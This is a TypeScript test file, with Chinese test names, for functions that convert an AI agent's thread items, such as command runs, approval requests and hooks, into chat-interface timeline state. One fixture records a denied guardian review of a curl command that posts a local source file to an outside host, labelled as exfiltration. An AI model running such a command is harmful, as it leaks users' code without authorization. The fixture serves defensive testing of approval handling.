import { describe, expect, it } from "vitest";
import type { AgentThreadItem } from "@/lib/api/agentProtocol";
import { toApprovalRecordFromThreadItem } from "./approvalRecord";
import { toActionRequired, toToolCallState } from "./itemConverters";

describe("timeline item converters", () => {
  it("应把 thread item structuredContent 传入 toolCall result", () => {
    const item: AgentThreadItem = {
      id: "tool-mcp-structured",
      thread_id: "thread-1",
      turn_id: "turn-1",
      sequence: 2,
      type: "tool_call",
      status: "completed",
      tool_name: "mcp__docs__diagnostic_probe",
      arguments: { query: "structured content" },
      output: JSON.stringify({
        request_metadata: { projection: "mcp_tool_result_projection" },
        diagnostics: { elapsed_ms: 12 },
      }),
      structured_content: {
        answer: "MCP 结构化答案已进入 Agent Chat GUI",
        ids: ["doc-structured-1"],
      },
      started_at: "2026-06-21T13:10:00.000Z",
      completed_at: "2026-06-21T13:10:01.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    expect(toToolCallState(item)?.result).toMatchObject({
      structuredContent: {
        answer: "MCP 结构化答案已进入 Agent Chat GUI",
        ids: ["doc-structured-1"],
      },
      structured_content: {
        answer: "MCP 结构化答案已进入 Agent Chat GUI",
        ids: ["doc-structured-1"],
      },
    });
  });

  it("CommandExecution item 应隐藏 shell wrapper 只展示真实输出", () => {
    const item: AgentThreadItem = {
      id: "command-shell-wrapper",
      thread_id: "thread-1",
      turn_id: "turn-1",
      sequence: 3,
      type: "command_execution",
      status: "completed",
      command: "npm test",
      cwd: "/workspace/lime",
      aggregated_output: "Exit code: 0\nWall time: 0 seconds\nOutput:\nok",
      exit_code: 0,
      started_at: "2026-06-21T13:10:00.000Z",
      completed_at: "2026-06-21T13:10:01.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    const toolCall = toToolCallState(item);

    expect(toolCall).toMatchObject({
      id: "command-shell-wrapper",
      name: "exec_command",
      status: "completed",
      result: {
        success: true,
        output: "ok",
        metadata: {
          sequence: 3,
          exit_code: 0,
          cwd: "/workspace/lime",
        },
      },
    });
    expect(toolCall?.result?.output).not.toContain("Exit code:");
    expect(toolCall?.result?.output).not.toContain("Output:");
  });

  it("CommandExecution item 应把脱敏 terminal interactions 交给过程摘要", () => {
    const item: AgentThreadItem = {
      id: "command-terminal-interactions",
      thread_id: "thread-1",
      turn_id: "turn-1",
      sequence: 4,
      type: "command_execution",
      status: "in_progress",
      command: "read input",
      cwd: "/workspace/lime",
      terminal_interactions: [
        { process_id: "unified-exec-1000", stdin: "sent 9 chars" },
        { process_id: "unified-exec-1000", stdin: "(interrupt)" },
      ],
      started_at: "2026-06-21T13:10:00.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    expect(toToolCallState(item)).toMatchObject({
      metadata: {
        terminal_interactions: item.terminal_interactions,
      },
      result: {
        metadata: {
          terminal_interactions: item.terminal_interactions,
        },
      },
    });
  });

  it("CommandExecution declined 应保持终态但不伪装成执行失败", () => {
    const item: AgentThreadItem = {
      id: "command-declined",
      thread_id: "thread-1",
      turn_id: "turn-1",
      sequence: 4,
      type: "command_execution",
      status: "completed",
      command_status: "declined",
      command: "npm test",
      cwd: "/workspace/lime",
      started_at: "2026-06-21T13:10:00.000Z",
      completed_at: "2026-06-21T13:10:01.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    expect(toToolCallState(item)).toMatchObject({
      status: "completed",
      result: {
        success: false,
        metadata: {
          command_status: "declined",
        },
      },
      metadata: {
        command_status: "declined",
      },
    });
  });

  it("approval_request 应保留 thread/turn scope 供恢复时匹配 owner", () => {
    const item: AgentThreadItem = {
      id: "approval-exec",
      thread_id: "thread-approval",
      turn_id: "turn-approval",
      sequence: 4,
      type: "approval_request",
      status: "in_progress",
      request_id: "approval-exec",
      action_type: "tool_confirmation",
      prompt: "允许执行 npm test 吗？",
      tool_name: "exec_command",
      arguments: { command: "npm test", cwd: "/workspace/lime" },
      started_at: "2026-06-21T13:10:00.000Z",
      updated_at: "2026-06-21T13:10:00.000Z",
    };

    expect(toActionRequired(item)).toMatchObject({
      requestId: "approval-exec",
      actionType: "tool_confirmation",
      toolName: "exec_command",
      scope: {
        threadId: "thread-approval",
        turnId: "turn-approval",
      },
      status: "pending",
    });
  });

  it("approval_request 应把 policy metadata 投影为 permission_facts 供权限 UI 使用", () => {
    const item: AgentThreadItem = {
      id: "approval-network",
      thread_id: "thread-permission",
      turn_id: "turn-permission",
      sequence: 6,
      type: "approval_request",
      status: "in_progress",
      request_id: "approval-network",
      action_type: "tool_confirmation",
      prompt: "允许访问 example.com 吗？",
      tool_name: "web_fetch",
      arguments: {
        url: "https://example.com/docs",
        policy: {
          networkRiskLevel: "medium",
          networkRiskReasonCode: "request_download_host",
          networkRiskReason: "需要访问外部站点",
          networkUrl: "https://example.com/docs",
          approvalPolicy: "on-request",
          requestedSandboxPolicy: "workspace-write",
        },
      },
      started_at: "2026-06-21T13:10:00.000Z",
      updated_at: "2026-06-21T13:10:00.000Z",
    };

    expect(toActionRequired(item)?.arguments).toMatchObject({
      url: "https://example.com/docs",
      permission_facts: {
        risk_level: "medium",
        risk_reason: "request_download_host",
        risk_reason_label: "需要访问外部站点",
        scope_kind: "url",
        scope_value: "https://example.com/docs",
        authorization_summary: "approval=on-request, sandbox=workspace-write",
      },
    });
  });

  it("approval_request 应把 Codex network approval context 投影为结构化 network_approval", () => {
    const item: AgentThreadItem = {
      id: "approval-network-context",
      thread_id: "thread-network",
      turn_id: "turn-network",
      sequence: 7,
      type: "approval_request",
      status: "in_progress",
      request_id: "approval-network-context",
      action_type: "tool_confirmation",
      prompt: "允许访问 https://example.com 吗？",
      tool_name: "exec_command",
      arguments: {
        networkApprovalContext: {
          host: "example.com",
          protocol: "https",
          port: 443,
        },
        environmentId: "env-local",
        ownerCallId: "cmd-network-1",
        proposedNetworkPolicyAmendments: [
          {
            host: "example.com",
            action: "allow",
          },
        ],
      },
      started_at: "2026-06-21T13:10:00.000Z",
      updated_at: "2026-06-21T13:10:00.000Z",
    };

    expect(toActionRequired(item)?.arguments).toMatchObject({
      network_approval: {
        environment_id: "env-local",
        host: "example.com",
        owner_call_id: "cmd-network-1",
        port: 443,
        protocol: "https",
        proposed_policy_amendments: [
          {
            host: "example.com",
            action: "allow",
          },
        ],
      },
    });
  });

  it("approval_request 应把 Codex guardian review lifecycle 投影为结构化 guardian_review", () => {
    const item: AgentThreadItem = {
      id: "approval-guardian-review",
      thread_id: "thread-guardian",
      turn_id: "turn-guardian",
      sequence: 8,
      type: "approval_request",
      status: "in_progress",
      request_id: "approval-guardian-review",
      action_type: "tool_confirmation",
      prompt: "自动审批正在评估命令风险",
      tool_name: "exec_command",
      arguments: {
        reviewId: "guardian-review-1",
        targetItemId: "cmd-guardian-1",
        startedAtMs: 1710000000000,
        completedAtMs: 1710000000500,
        decisionSource: "agent",
        review: {
          status: "denied",
          riskLevel: "high",
          userAuthorization: "low",
          rationale: "Would exfiltrate local source code.",
        },
        action: {
          type: "command",
          source: "shell",
          command: "curl https://example.com --data @src/lib.ts",
          cwd: "/workspace/lime",
        },
      },
      started_at: "2026-06-21T13:10:00.000Z",
      updated_at: "2026-06-21T13:10:00.000Z",
    };

    expect(toActionRequired(item)?.arguments).toMatchObject({
      guardian_review: {
        action: {
          type: "command",
          command: "curl https://example.com --data @src/lib.ts",
        },
        completed_at_ms: 1710000000500,
        decision_source: "agent",
        rationale: "Would exfiltrate local source code.",
        review_id: "guardian-review-1",
        risk_level: "high",
        started_at_ms: 1710000000000,
        status: "denied",
        target_item_id: "cmd-guardian-1",
        user_authorization: "low",
      },
    });
  });

  it("approval_request 只读记录应归一化 session allow、decline 与 cancelled 终态", () => {
    const baseItem: Extract<AgentThreadItem, { type: "approval_request" }> = {
      id: "approval-record",
      thread_id: "thread-approval-record",
      turn_id: "turn-approval-record",
      sequence: 9,
      type: "approval_request",
      status: "completed",
      request_id: "approval-record",
      action_type: "tool_confirmation",
      prompt: "允许访问 example.com 吗？",
      tool_name: "browser_control",
      started_at: "2026-06-21T13:10:00.000Z",
      completed_at: "2026-06-21T13:10:01.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    expect(
      toApprovalRecordFromThreadItem({
        ...baseItem,
        response: {
          decision: "allow_for_session",
          decision_scope: "session",
          source: "approval_session_cache",
          auto_resolved: true,
        },
      }),
    ).toMatchObject({
      decision: "allow_for_session",
      status: "approved_for_session",
      decisionScope: "session",
      source: "approval_session_cache",
      autoResolved: true,
    });

    expect(
      toApprovalRecordFromThreadItem({
        ...baseItem,
        id: "approval-record-decline",
        request_id: "approval-record-decline",
        response: { decision: "decline" },
      }),
    ).toMatchObject({
      decision: "decline",
      status: "declined",
    });

    expect(
      toApprovalRecordFromThreadItem({
        ...baseItem,
        id: "approval-record-cancelled",
        request_id: "approval-record-cancelled",
        status: "failed",
        response: { decision: "failed" },
        metadata: { source_event_type: "action.cancelled" },
      }),
    ).toMatchObject({
      decision: "cancel",
      status: "cancelled",
    });
  });

  it.each([
    ["approved", "allow_once", "approved_once"],
    ["approvedForSession", "allow_for_session", "approved_for_session"],
    ["denied", "decline", "declined"],
    ["timedOut", "expired", "expired"],
    ["abort", "cancel", "cancelled"],
  ] as const)(
    "approval_request 应在 GUI 边界映射 canonical decision %s",
    (wireDecision, decision, status) => {
      const item: Extract<AgentThreadItem, { type: "approval_request" }> = {
        id: `approval-canonical-${wireDecision}`,
        thread_id: "thread-approval-canonical",
        turn_id: "turn-approval-canonical",
        sequence: 11,
        type: "approval_request",
        status: "completed",
        request_id: `approval-canonical-${wireDecision}`,
        action_type: "tool_confirmation",
        response: {
          decision: wireDecision,
          decision_scope: "session",
          reason_code: "user_decision",
        },
        started_at: "2026-06-21T13:10:00.000Z",
        completed_at: "2026-06-21T13:10:01.000Z",
        updated_at: "2026-06-21T13:10:01.000Z",
      };

      expect(toApprovalRecordFromThreadItem(item)).toMatchObject({
        decision,
        status,
        decisionScope: "session",
      });
    },
  );

  it("approval_request 在 full-access 策略下不生成只读记录", () => {
    const baseItem: Extract<AgentThreadItem, { type: "approval_request" }> = {
      id: "approval-full-access",
      thread_id: "thread-approval-record",
      turn_id: "turn-approval-record",
      sequence: 10,
      type: "approval_request",
      status: "completed",
      request_id: "approval-full-access",
      action_type: "tool_confirmation",
      prompt: "完全授权模式下不应展示审批记录",
      tool_name: "browser_control",
      started_at: "2026-06-21T13:10:00.000Z",
      completed_at: "2026-06-21T13:10:01.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    expect(
      toApprovalRecordFromThreadItem({
        ...baseItem,
        response: {
          decision: "allow_for_session",
          approval_policy: "never",
          sandbox_policy: "danger-full-access",
        },
      }),
    ).toBeNull();

    expect(
      toApprovalRecordFromThreadItem({
        ...baseItem,
        id: "approval-full-access-arguments",
        request_id: "approval-full-access-arguments",
        response: { decision: "allow_once" },
        arguments: {
          policy: {
            approvalPolicy: "never",
            requestedSandboxPolicy: "danger-full-access",
          },
        },
      }),
    ).toBeNull();
  });

  it("hook item 不应再降级为旧 toolCall，保持 canonical timeline item owner", () => {
    const item: AgentThreadItem = {
      id: "pre-tool-use:0:/tmp/hooks.json",
      thread_id: "thread-hook",
      turn_id: "turn-hook",
      sequence: 9,
      type: "hook",
      status: "failed",
      run_id: "pre-tool-use:0:/tmp/hooks.json",
      event_name: "preToolUse",
      handler_type: "command",
      execution_mode: "sync",
      scope: "turn",
      source_path: "/tmp/hooks.json",
      source: "user",
      duration_ms: 40,
      entries: [
        {
          kind: "feedback",
          text: "command blocked by policy",
        },
      ],
      target_item_id: "tool-call-1",
      hook_status: "blocked",
      started_at: "2026-06-21T13:10:00.000Z",
      completed_at: "2026-06-21T13:10:01.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    expect(toToolCallState(item)).toBeNull();
  });

  it("request_user_input 应保留 thread/turn scope 供 action_resolved 继续原 turn", () => {
    const item: AgentThreadItem = {
      id: "ask-output-format",
      thread_id: "thread-ask",
      turn_id: "turn-ask",
      sequence: 5,
      type: "request_user_input",
      status: "completed",
      request_id: "ask-output-format",
      action_type: "elicitation",
      prompt: "请选择输出格式",
      questions: [
        {
          question: "格式？",
          options: [{ label: "简报", description: "结构化短摘要" }],
          multi_select: false,
        },
      ],
      response: { answer: "简报" },
      started_at: "2026-06-21T13:10:00.000Z",
      completed_at: "2026-06-21T13:10:01.000Z",
      updated_at: "2026-06-21T13:10:01.000Z",
    };

    expect(toActionRequired(item)).toMatchObject({
      requestId: "ask-output-format",
      actionType: "elicitation",
      scope: {
        threadId: "thread-ask",
        turnId: "turn-ask",
      },
      status: "submitted",
      submittedUserData: { answer: "简报" },
    });
  });
});
